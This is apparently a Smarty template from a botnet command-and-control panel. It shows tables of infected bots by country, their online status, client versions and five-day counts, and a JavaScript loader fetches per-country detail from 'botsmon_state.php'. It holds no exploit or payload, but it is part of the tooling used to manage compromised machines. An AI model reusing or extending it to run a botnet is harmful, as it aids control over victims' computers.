{literal}
<script type="text/javascript">
function getState(idc) 
{
	var b = document.getElementById('bfc' + idc);
	var tr = document.getElementById('tfc' + idc);
	var td = document.getElementById('fc' + idc);
	if (b && tr && td) 
	{
		if (b.src.indexOf('icos/info.png') == -1) {
		
			b.src = 'img/icos/info.png';
			td.innerHTML = '';
		}
		else 
		{
			$("#fc"+idc).load('./mod/botsmon_state.php?idc=' + idc);
			b.src = 'img/icos/info-gray16.png';
		}
	}
}
</script>
{/literal}

{if isset($CONT_ARR)}
<h2><b>GEO info</b></h2>
<script>displayAlrmElts();</script>

<table width='740px' border='1' cellspacing='0' cellpadding='0' style='border: 1px solid gray; font-size: 9px; border-collapse: collapse; background-color: white;'><th>Flag</th><th>Country</th><th>Online Bots/All Bots</th><th>Detail State</th>

{foreach from=$CONT_ARR item=REC}
	<tr align='center' id=tid{$REC.I}>
	<td width='30px'><img border='0' src='img/flags/{$REC.CCODE}.gif'></td>
	<td width='200px'>{$REC.MRES_NC}</td>
	<td><font style='font-size: 14px;'>({$REC.ACTB_CNT}/{$REC.ALLB_CNT})</font></td>
	<td width='30px'><a href='javascript:void();' onclick='getState({$REC.IDC}); return false;'><img id='bfc{$REC.IDC}' src='img/icos/info.png' border='0'></a></td>
	</tr>
	<tr align='center' id='tfc{$REC.IDC}'><td></td><td id='fc{$REC.IDC}' colspan='3'></td></tr>
{foreachelse}
{/foreach}
</table>
{else}
	<font class='error'>There are no bots</font>
{/if}

{if isset($CONT_ARR2)}
<h2><b>Version info</b></h2>

<table width='240px' border='1' cellspacing='0' cellpadding='0' style='border: 1px solid gray; font-size: 9px; border-collapse: collapse; background-color: white;'><th>Version</th><th>Count (online / all)</th>

	{foreach from=$CONT_ARR2 item=ITEM}{$ITEM}{/foreach}
	
</table>
{/if}

{if isset($CONT_ARR3)}
<h2><b>Count of bots for last 5 days</b></h2>

<table width='240px' border='1' cellspacing='0' cellpadding='0' style='border: 1px solid gray; font-size: 9px; border-collapse: collapse; background-color: white;'><th>Date</th><th>Count (online / all)</th>

	{foreach from=$CONT_ARR3 item=ITEM}{$ITEM}{/foreach}
</table>
{/if}